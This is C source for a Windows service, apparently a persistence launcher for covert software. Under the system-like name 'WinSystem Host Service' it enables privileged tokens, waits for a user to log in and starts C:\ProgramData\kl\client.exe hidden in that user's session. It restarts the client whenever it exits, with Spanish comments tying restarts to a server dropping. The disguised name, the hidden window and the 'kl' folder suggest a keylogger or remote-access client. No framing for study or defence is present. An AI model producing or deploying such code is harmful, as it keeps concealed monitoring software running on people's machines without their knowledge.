#include <stdio.h>
#include <windows.h>
#include <wtsapi32.h>
#include <userenv.h>

#define SERVICE_NAME "WinSystem Host Service"
#define CLIENT_PATH "C:\\ProgramData\\kl\\client.exe"

SERVICE_STATUS        gStatus;
SERVICE_STATUS_HANDLE gStatusHandle;
HANDLE                gStopEvent = NULL;
HANDLE                gChild = NULL;

static void SetState(DWORD state, DWORD exitCode, DWORD waitHint){
    gStatus.dwCurrentState = state;
    gStatus.dwWin32ExitCode = exitCode;
    gStatus.dwWaitHint = waitHint;
    SetServiceStatus(gStatusHandle, &gStatus);
}

static BOOL EnablePrivilege(LPCSTR name){
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL ok;

    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)){
        return FALSE;
    }
    if(!LookupPrivilegeValueA(NULL, name, &luid)){
        CloseHandle(token);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(token);
    return ok;
}

static BOOL StartClientInUserSession(void){
    DWORD sessionId;
    HANDLE userToken = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char commandLine[MAX_PATH + 8];
    BOOL ok = FALSE;

    sessionId = WTSGetActiveConsoleSessionId();
    if(sessionId == 0xFFFFFFFF){
        return FALSE;                       // todavia no hay sesion activa
    }
    if(!WTSQueryUserToken(sessionId, &userToken)){
        return FALSE;                       // nadie ha iniciado sesion todavia
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = (LPSTR)"winsta0\\default";   // escritorio del usuario

    ZeroMemory(&pi, sizeof(pi));
    lstrcpyA(commandLine, CLIENT_PATH);

    //CREATE_NO_WINDOW: THE CLIENT IS A CONSOLE APP BUT MUST NOT ALLOCATE A VISIBLE
    //CONSOLE WINDOW, OTHERWISE A WINDOW FLASHES EVERY TIME IT IS RELAUNCHED
    ok = CreateProcessAsUserA(userToken, NULL, commandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if(ok){
        gChild = pi.hProcess;
        CloseHandle(pi.hThread);
    }
    CloseHandle(userToken);
    return ok;
}

static DWORD WINAPI ServiceHandler(DWORD control, DWORD eventType, LPVOID data, LPVOID context){
    (void)eventType; (void)data; (void)context;

    switch(control){
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            SetState(SERVICE_STOP_PENDING, NO_ERROR, 5000);
            SetEvent(gStopEvent);
            return NO_ERROR;
        case SERVICE_CONTROL_INTERROGATE:
            return NO_ERROR;
        default:
            return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

static void WINAPI ServiceMain(DWORD argc, LPSTR *argv){
    HANDLE handles[2];
    DWORD waitResult;

    (void)argc; (void)argv;

    gStatusHandle = RegisterServiceCtrlHandlerExA(SERVICE_NAME, ServiceHandler, NULL);
    if(!gStatusHandle){
        return;
    }

    ZeroMemory(&gStatus, sizeof(gStatus));
    gStatus.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
    gStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

    SetState(SERVICE_START_PENDING, NO_ERROR, 5000);

    EnablePrivilege("SeTcbPrivilege");
    EnablePrivilege("SeAssignPrimaryTokenPrivilege");
    EnablePrivilege("SeIncreaseQuotaPrivilege");

    gStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if(!gStopEvent){
        SetState(SERVICE_STOPPED, ERROR_SERVICE_SPECIFIC_ERROR, 0);
        return;
    }

    SetState(SERVICE_RUNNING, NO_ERROR, 0);

    for(;;){
        if(WaitForSingleObject(gStopEvent, 0) == WAIT_OBJECT_0){
            break;
        }

        if(!StartClientInUserSession()){
            if(WaitForSingleObject(gStopEvent, 3000) == WAIT_OBJECT_0){
                break;
            }
            continue;                       // reintenta hasta que haya sesion
        }

        handles[0] = gChild;
        handles[1] = gStopEvent;
        waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);

        if(waitResult == WAIT_OBJECT_0 + 1){
            TerminateProcess(gChild, 0);
            WaitForSingleObject(gChild, 5000);
        }
        CloseHandle(gChild);
        gChild = NULL;

        if(waitResult == WAIT_OBJECT_0){
            // el cliente termino (p. ej. se cayo el servidor): relanza en 1s
            if(WaitForSingleObject(gStopEvent, 1000) == WAIT_OBJECT_0){
                break;
            }
        }
    }

    CloseHandle(gStopEvent);
    gStopEvent = NULL;
    SetState(SERVICE_STOPPED, NO_ERROR, 0);
}

int main(void){
    SERVICE_TABLE_ENTRYA table[] = {
        { (LPSTR)SERVICE_NAME, ServiceMain },
        { NULL, NULL }
    };

    if(!StartServiceCtrlDispatcherA(table)){
        return 1;                           // no se inicio como servicio
    }
    return 0;
}